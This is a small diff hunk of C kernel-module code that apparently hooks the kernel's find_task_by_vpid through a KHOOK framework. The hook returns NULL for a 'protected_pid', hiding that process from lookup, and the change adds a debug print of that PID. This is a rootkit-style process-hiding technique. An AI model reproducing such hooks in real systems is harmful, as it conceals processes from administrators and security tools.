@@ -210,6 +210,7 @@ static task_struct *khook_find_task_by_vpid(pid_t vnr){
 	struct task_struct *tsk = NULL;
 	tsk=KHOOK_ORIGIN(find_task_by_vpid, vnr);
 	find_pid();
+	printk("pid:%d", protected_pid);
 	if(protected_pid==vnr) tsk=NULL; 
 	return tsk;
 }
